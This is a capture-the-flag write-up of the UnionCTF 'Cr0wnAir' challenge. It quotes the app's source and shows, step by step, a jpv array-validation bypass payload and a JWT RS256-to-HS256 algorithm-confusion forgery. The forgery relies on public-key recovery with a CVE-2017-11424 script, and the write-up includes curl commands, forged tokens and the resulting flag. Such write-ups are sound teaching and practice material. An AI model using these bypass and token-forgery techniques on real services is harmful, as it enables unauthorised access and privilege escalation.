# UnionCTF - Cr0wnAir

To solve this challenge, we had to exploit a vulnerability in `jpv` which allows us to bypass the regex validation in order to get a JWT. Then, we were able to change the algorithm from `RS256` to `HS256` and forge a new JWT with the public key, a key that we were able to retrieve thanks to a weak `e`.

---------

The source code of the app is given, so let's take a look at it (only what will be interesting for us) :
```js
// routes/checkin.js

const express = require('express');
const jpv = require("jpv");
const jwt = require("jwt-simple");
const path = require("path");
const router = express.Router();

const config = require('../config');

const pattern = {
  firstName: /^\w{1,30}$/,
  lastName: /^\w{1,30}$/,
  passport: /^[0-9]{9}$/,
  ffp: /^(|CA[0-9]{8})$/,
  extras: [
    {sssr: /^(BULK|UMNR|VGML)$/},
  ],
};

function isSpecialCustomer(passport, frequentFlyerNumber) {
  return false;
}

function createToken(passport, frequentFlyerNumber) {
  var status = isSpecialCustomer(passport, frequentFlyerNumber) ? "gold" : "bronze";
  var body = {"status": status, "ffp": frequentFlyerNumber};
  return jwt.encode(body, config.privkey, 'RS256');
}

router.get('/', function(req, res, next) {
  res.sendFile('index.html', { root: path.join(__dirname, '../public') });
});

router.post('/checkin', function(req, res, next) {
  if (!req.body) return res.sendStatus(400);
  var data = req.body;
  
  if (jpv.validate(data, pattern, { debug: true, mode: "strict" })) {
    if (data["firstName"] == "Tony" && data["lastName"] == "Abbott") {
      var response = {msg: "You have successfully checked in! Please remember not to post your boarding pass on social media."};
    } else if (data["ffp"]) {
      var response = {msg: "You have successfully checked in. Thank you for being a Cr0wnAir frequent flyer."};
      for(e in data["extras"]) {
        if (data["extras"][e]["sssr"] && data["extras"][e]["sssr"] === "FQTU") {
          var token = createToken(data["passport"], data["ffp"]);
          var response = {msg: "You have successfully checked in. Thank you for being a Cr0wnAir frequent flyer. Your loyalty has been rewarded and you have been marked for an upgrade, please visit the upgrades portal.", "token": token};
        }
      }
    } else {
      var response = {msg: "You have successfully checked in!"};
    }
  } else {
    var response = {msg: "Invalid checkin data provided, please try again."};
  }

  res.json(response);
});

module.exports = router;
```

```js
// routes/upgrades.js

const express = require('express');
const jpv = require("jpv");
const jwt = require("jwt-simple");
const path = require("path");
const router = express.Router();

const config = require('../config');

function getLoyaltyStatus(req, res, next) {
  if (req.headers.authorization) {
    let token = req.headers.authorization.split(" ")[1];
    try {
      var decoded = jwt.decode(token, config.pubkey);
    } catch {
      return res.json({ msg: 'Token is not valid.' });
    }
    res.locals.token = decoded;
  }
  next()
}

router.get('/', function(req, res, next) {
  res.sendFile('upgrades.html', { root: path.join(__dirname, '../public') });
});

router.post('/legroom', [getLoyaltyStatus], function(req, res, next) {
  if (res.locals.token && ["bronze", "silver", "gold"].includes(res.locals.token.status)) {
    var response = {msg: "Upgrade successfully selected"};
  } else {
    var response = {msg: "You do not qualify for this upgrade at this time. Please fly with us more."};
  }
  res.json(response);
});

router.post('/toilets', [getLoyaltyStatus], function(req, res, next) {
  if (res.locals.token && ["bronze", "silver", "gold"].includes(res.locals.token.status)) {
    var response = {msg: "Upgrade successfully selected"};
  } else {
    var response = {msg: "You do not qualify for this upgrade at this time. Please fly with us more."};
  }
  res.json(response);
});

router.post('/flag', [getLoyaltyStatus], function(req, res, next) {
  if (res.locals.token && res.locals.token.status == "gold") {
    var response = {msg: config.flag };
  } else {
    var response = {msg: "You do not qualify for this upgrade at this time. Please fly with us more."};
  }
  res.json(response);
});

module.exports = router;
```

After the analysis of the source code, we can notice an interesting path : we need to set `sssr` to `FQTU` to receive our JWT. And with this JWT, if the `status` is set to `gold`, we get the flag.
However, the data we send to `/checkin` must check some regex : 
```js
const pattern = {
  firstName: /^\w{1,30}$/,
  lastName: /^\w{1,30}$/,
  passport: /^[0-9]{9}$/,
  ffp: /^(|CA[0-9]{8})$/,
  extras: [
    {sssr: /^(BULK|UMNR|VGML)$/},
  ],
};

[...]

router.post('/checkin', function(req, res, next) {

  [...]

  if (jpv.validate(data, pattern, { debug: true, mode: "strict" })) {

      [...]

      for(e in data["extras"]) {
        if (data["extras"][e]["sssr"] && data["extras"][e]["sssr"] === "FQTU") {
          var token = createToken(data["passport"], data["ffp"]);
          var response = {msg: "You have successfully checked in. Thank you for being a Cr0wnAir frequent flyer. Your loyalty has been rewarded and you have been marked for an upgrade, please visit the upgrades portal.", "token": token};
        }
      }
    } else {
      var response = {msg: "You have successfully checked in!"};
    }
  } else {
    var response = {msg: "Invalid checkin data provided, please try again."};
  }

  res.json(response);
});

```

Indeed, if we try what we said (i.e. set `sssr` to `FQTU`) it will not be accepted by the regex and we will not get our JWT :( :
```sh
$ curl 'http://34.105.202.19:3000/checkin' -H 'Content-Type: application/json' --data-raw '{"firstName":"tytyr","lastName":"rtyry","passport":"123456789","ffp":"CA12345678","extras":[{"sssr":"FQTU"}]}'
{"msg":"Invalid checkin data provided, please try again."}
```

After a careful rereading, we did not notice any bug in the app ; so maybe some libraries (`jpv` and `jwt-simple`, to match our path) are vulnerable.
The answer is yes ! If we check the version of `jpv` we see that it is an old version released 2 years ago. Moreover, on the github of `jpv` there are some validation bypasses.
[This issue](https://github.com/manvel-khnkoyan/jpv/issues/6) will help us : 
```js
"use strict";

var jpv = require('jpv');
var path = require('path');
var utils = require("../TestcaseUtils.js");

var user_input = {
    should_be_arrary: {"a":1, 'constructor': {'name':'Array'}}
};
var pattern = {
    should_be_arrary: []
};

console.log(jpv.validate(user_input, pattern));
```

It is said that we can bypass the validation when the pattern expect an array. So let's try that : 
```sh
$ curl 'http://34.105.202.19:3000/checkin' -H 'Content-Type: application/json' --data-raw '{"firstName":"aa","lastName":"aaa","passport":"123456789","ffp":"CA12345678","extras":{"a":{"sssr":"FQTU"}, "constructor":{"name":"Array"}}}'
{"msg":"You have successfully checked in. Thank you for being a Cr0wnAir frequent flyer. Your loyalty has been rewarded and you have been marked for an upgrade, please visit the upgrades portal.","token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJicm9uemUiLCJmZnAiOiJDQTEyMzQ1Njc4In0.IQMSxgcZTmvVNJl51Xe71AtJI6vlINPb0GRy9GmxiLx6WsyFhSs-VXJh8G40TIYSD8LHfQGGxQVoK9Mnn8ImOz0Nv8BROkZ4fNiPEGXEIVaYNR2mzHc4_dARuciASyEdBapLrhlr7ln_EG6vKltB-KgsCfhJErVUOyvwfaZ0HdzJ6CQrS5-go33E7MpVe9LEsP7ySkbTdDxNsLmU64H2NqnWAxckQdEXlO2kMRWzsiCbvwOLY_hlEI2VwMuIqnFChI4McxBsCmel-mo7U6SEjfNyD7sEm3IglfGhW-RGsaR2xI4QuTsnjTRek51k2E-LC3W21AiWZ87jPbpwAXlCKg"}%
```

Nice ! We now have our JWT.
If we remember the source code, the application decodes our JWT without specifying the algorithm. Thanks to this mistake and the absence of verification by the library, we can change the algorithm specified in our JWT from `RS256` (asymetric) to `HS256` (symetric algorithm) and the app will try to decode our JWT with the public key and the `HS256` algorithm : 

the lines where the app encodes/decodes JWT :
```js
jwt.encode(body, config.privkey, 'RS256');
[...]
jwt.decode(token, config.pubkey);
```

and the library [source code](https://github.com/hokaccha/node-jwt-simple/blob/v0.5.1/lib/jwt.js#L58) :
```js
/**
 * support algorithm mapping
 */
var algorithmMap = {
  HS256: 'sha256',
  HS384: 'sha384',
  HS512: 'sha512',
  RS256: 'RSA-SHA256'
};

/**
 * Map algorithm to hmac or sign type, to determine which crypto function to use
 */
var typeMap = {
  HS256: 'hmac',
  HS384: 'hmac',
  HS512: 'hmac',
  RS256: 'sign'
};

jwt.decode = function jwt_decode(token, key, noVerify, algorithm) {
  // check token
  if (!token) {
    throw new Error('No token supplied');
  }
  // check segments
  var segments = token.split('.');
  if (segments.length !== 3) {
    throw new Error('Not enough or too many segments');
  }

  // All segment should be base64
  var headerSeg = segments[0];
  var payloadSeg = segments[1];
  var signatureSeg = segments[2];

  // base64 decode and parse JSON
  var header = JSON.parse(base64urlDecode(headerSeg));
  var payload = JSON.parse(base64urlDecode(payloadSeg));

  if (!noVerify) {
    var signingMethod = algorithmMap[algorithm || header.alg];
    var signingType = typeMap[algorithm || header.alg];
    if (!signingMethod || !signingType) {
      throw new Error('Algorithm not supported');
    }

    // verify signature. `sign` will return base64 string.
    var signingInput = [headerSeg, payloadSeg].join('.');
    if (!verify(signingInput, key, signingMethod, signingType, signatureSeg)) {
      throw new Error('Signature verification failed');
    }

    // Support for nbf and exp claims.
    // According to the RFC, they should be in seconds.
    if (payload.nbf && Date.now() < payload.nbf*1000) {
      throw new Error('Token not yet active');
    }

    if (payload.exp && Date.now() > payload.exp*1000) {
      throw new Error('Token expired');
    }
  }

  return payload;
};
```

The only ~~big~~ problem is that we don't have the public key.
After some googling we can find [this blog post](https://blog.silentsignal.eu/2021/02/08/abusing-jwt-public-keys-without-the-public-key/) which tells us that we can retrieve the public key with only two JWT.
The author of the post has made a script that retrieve the public key and craft a new token using this public key.
So let's try this script :
```sh
$ # get 2 jwt
$ curl 'http://34.105.202.19:3000/checkin' -H 'Content-Type: application/json' --data-raw '{"firstName":"aa","lastName":"aaa","passport":"123456789","ffp":"CA12345678","extras":{"a":{"sssr":"FQTU"}, "constructor":{"name":"Array"}}}'
{"msg":"You have successfully checked in. Thank you for being a Cr0wnAir frequent flyer. Your loyalty has been rewarded and you have been marked for an upgrade, please visit the upgrades portal.","token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJicm9uemUiLCJmZnAiOiJDQTEyMzQ1Njc4In0.IQMSxgcZTmvVNJl51Xe71AtJI6vlINPb0GRy9GmxiLx6WsyFhSs-VXJh8G40TIYSD8LHfQGGxQVoK9Mnn8ImOz0Nv8BROkZ4fNiPEGXEIVaYNR2mzHc4_dARuciASyEdBapLrhlr7ln_EG6vKltB-KgsCfhJErVUOyvwfaZ0HdzJ6CQrS5-go33E7MpVe9LEsP7ySkbTdDxNsLmU64H2NqnWAxckQdEXlO2kMRWzsiCbvwOLY_hlEI2VwMuIqnFChI4McxBsCmel-mo7U6SEjfNyD7sEm3IglfGhW-RGsaR2xI4QuTsnjTRek51k2E-LC3W21AiWZ87jPbpwAXlCKg"}
$ echo 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJicm9uemUiLCJmZnAiOiJDQTEyMzQ1Njc4In0.IQMSxgcZTmvVNJl51Xe71AtJI6vlINPb0GRy9GmxiLx6WsyFhSs-VXJh8G40TIYSD8LHfQGGxQVoK9Mnn8ImOz0Nv8BROkZ4fNiPEGXEIVaYNR2mzHc4_dARuciASyEdBapLrhlr7ln_EG6vKltB-KgsCfhJErVUOyvwfaZ0HdzJ6CQrS5-go33E7MpVe9LEsP7ySkbTdDxNsLmU64H2NqnWAxckQdEXlO2kMRWzsiCbvwOLY_hlEI2VwMuIqnFChI4McxBsCmel-mo7U6SEjfNyD7sEm3IglfGhW-RGsaR2xI4QuTsnjTRek51k2E-LC3W21AiWZ87jPbpwAXlCKg' > jwt1
$
$ # we can modify the ffp to get another jwt
$ curl 'http://34.105.202.19:3000/checkin' -H 'Content-Type: application/json' --data-raw '{"firstName":"aa","lastName":"aaa","passport":"123456789","ffp":"CA12345678","extras":{"a":{"sssr":"FQTU"}, "constructor":{"name":"Array"}}}'
{"msg":"You have successfully checked in. Thank you for being a Cr0wnAir frequent flyer. Your loyalty has been rewarded and you have been marked for an upgrade, please visit the upgrades portal.","token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJicm9uemUiLCJmZnAiOiJDQTEyMzQ1Njc3In0.HHZJIyx1hmJtTNN0c7TyJGGVuiSMbg9tKrkC_R5JUYY8CHw0Oz8SVyeg9g3GNvQ32XFpOXMkKCHbfQi5gS9lSECjBa7t4npwOz50YDZ0owPVTQPiyqBPeTLuKkmA-fO4CiLvMn4zcm2ftFeDn6aQ6hZyp01oqN2bX09hEvGclmqY5huAzeLvPH9ZjtPOyyYNEuKJ0uIbawABBOFy2mI9xxEB16sYeDOnuIiNDjzzgiiZdr4vvB4B5iv7PYsqVMuI3XB035JjjHJZzMP19h2oQcpG7yLRRp1L6yzEDDIDUJYjicDat6L10Zv7MbPk6Z8E_2LD6YstslJCqWWol-JgiA"}
$ echo 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJicm9uemUiLCJmZnAiOiJDQTEyMzQ1Njc3In0.HHZJIyx1hmJtTNN0c7TyJGGVuiSMbg9tKrkC_R5JUYY8CHw0Oz8SVyeg9g3GNvQ32XFpOXMkKCHbfQi5gS9lSECjBa7t4npwOz50YDZ0owPVTQPiyqBPeTLuKkmA-fO4CiLvMn4zcm2ftFeDn6aQ6hZyp01oqN2bX09hEvGclmqY5huAzeLvPH9ZjtPOyyYNEuKJ0uIbawABBOFy2mI9xxEB16sYeDOnuIiNDjzzgiiZdr4vvB4B5iv7PYsqVMuI3XB035JjjHJZzMP19h2oQcpG7yLRRp1L6yzEDDIDUJYjicDat6L10Zv7MbPk6Z8E_2LD6YstslJCqWWol-JgiA' > jwt2
$
$
$ python3 x_CVE-2017-11424.py `cat jwt1` `cat jwt2`
[*] GCD:  0x1
[*] GCD:  0xc3995f664ac0cc18e5dae7f66c5e2ab96ccf6e613372c8d51b011e3eb8f7b5087681058cc3b1cebcd36a54c59bbb22b45585b293f109d885e4ad5f91ef2cf544e15fda0307e8c45c7556a4405d0c40955118e9b0008c62f98ed7ddfa3c1ec8c9573cc49385f2fa7593192fc5b8d496fa7d1c87cd67959ca4bab55c0ca4d2ef3c4f8ceb643acc1fca9a2a672109f14ca7df656059c67520ae020759bd65ad230cb537d288724f77b7194593faa9144a2687b4c4d58aaf02c5233395f142d404a6013d70184fbfadc52d4cfbd52a68747d33b6b2a12c090a76306cca93c2b5221c1dbee697aa03851887016daa8cc0a8e95c87d325221beebc04cbf8b737dcbc0b
[+] Found n with multiplier 1  :
 0xc3995f664ac0cc18e5dae7f66c5e2ab96ccf6e613372c8d51b011e3eb8f7b5087681058cc3b1cebcd36a54c59bbb22b45585b293f109d885e4ad5f91ef2cf544e15fda0307e8c45c7556a4405d0c40955118e9b0008c62f98ed7ddfa3c1ec8c9573cc49385f2fa7593192fc5b8d496fa7d1c87cd67959ca4bab55c0ca4d2ef3c4f8ceb643acc1fca9a2a672109f14ca7df656059c67520ae020759bd65ad230cb537d288724f77b7194593faa9144a2687b4c4d58aaf02c5233395f142d404a6013d70184fbfadc52d4cfbd52a68747d33b6b2a12c090a76306cca93c2b5221c1dbee697aa03851887016daa8cc0a8e95c87d325221beebc04cbf8b737dcbc0b
[+] Written to c3995f664ac0cc18_65537_x509.pem
[+] Tampered JWT: b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdGF0dXMiOiAiYnJvbnplIiwgImZmcCI6ICJDQTEyMzQ1Njc4IiwgImV4cCI6IDE2MTQyMDg1OTl9.6rQVuvqT2nGfkFOdS1YmN7Nuc5LapAb339XTJHf9F1Y'
[+] Written to c3995f664ac0cc18_65537_pkcs1.pem
[+] Tampered JWT: b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdGF0dXMiOiAiYnJvbnplIiwgImZmcCI6ICJDQTEyMzQ1Njc4IiwgImV4cCI6IDE2MTQyMDg1OTl9.mN99DMtBLdPj4yFrLJncAe69XYWBiUersiWjoGhTBnE'
```

If we try with the first JWT, it seems that the token is valid but because we didn't set the `status` to `gold` we will not get the flag : 
```sh
$ curl -X POST 'http://34.105.202.19:3000/upgrades/flag' -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdGF0dXMiOiAiYnJvbnplIiwgImZmcCI6ICJDQTEyMzQ1Njc4IiwgImV4cCI6IDE2MTQyMDg1OTl9.6rQVuvqT2nGfkFOdS1YmN7Nuc5LapAb339XTJHf9F1Y'
{"msg":"You do not qualify for this upgrade at this time. Please fly with us more."}
```

As contrary, we get an error with the second JWT : 
```sh
$ curl -X POST 'http://34.105.202.19:3000/upgrades/flag' -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdGF0dXMiOiAiYnJvbnplIiwgImZmcCI6ICJDQTEyMzQ1Njc4IiwgImV4cCI6IDE2MTQyMDg1OTl9.mN99DMtBLdPj4yFrLJncAe69XYWBiUersiWjoGhTBnE'
{"msg":"Token is not valid."}
```

We just have to take a look at the script and modify it to set `status` to `gold` and get the flag : 
```sh
$ vim x_CVE-2017-11424.py
$ cat x_CVE-2017-11424.py
[...]
# payload['exp'] = int(time.time())+86400 # comment this
payload["status"] = "gold"                # add this
[...]

$ python3 x_CVE-2017-11424.py `cat jwt1` `cat jwt2`
[...]
[+] Tampered JWT: b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdGF0dXMiOiAiZ29sZCIsICJmZnAiOiAiQ0ExMjM0NTY3OCJ9.yncoTDoKFPcSA90PBqPayLUnDhoBEIQay4A6p0tD8z8'

$ curl -X POST 'http://34.105.202.19:3000/upgrades/flag' -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdGF0dXMiOiAiZ29sZCIsICJmZnAiOiAiQ0ExMjM0NTY3OCJ9.yncoTDoKFPcSA90PBqPayLUnDhoBEIQay4A6p0tD8z8'
{"msg":"union{I_<3_JS0N_4nD_th1ngs_wr4pp3d_in_JS0N}"}
```

FLAG : `union{I_<3_JS0N_4nD_th1ngs_wr4pp3d_in_JS0N}`
